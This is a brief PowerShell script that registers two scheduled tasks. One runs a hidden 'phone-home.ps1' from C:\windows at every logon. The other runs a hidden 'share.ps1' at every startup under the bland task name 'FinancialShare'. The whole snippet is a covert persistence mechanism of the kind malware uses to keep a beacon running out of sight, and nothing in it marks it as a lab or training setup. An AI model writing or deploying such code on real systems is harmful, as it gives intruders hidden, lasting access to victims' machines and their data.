$Sta = New-ScheduledTaskAction -Execute "powershell -windowstyle hidden C:\windows\phone-home.ps1"
$Stt = New-ScheduledTaskTrigger -AtLogon 
Register-ScheduledTask ET-Onlogon -Action $Sta -Trigger $Stt


$share_Sta = New-ScheduledTaskAction -Execute "powershell -windowstyle hidden C:\windows\share.ps1"
$share_Stt = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask FinancialShare -Action $share_Sta -Trigger $share_Stt
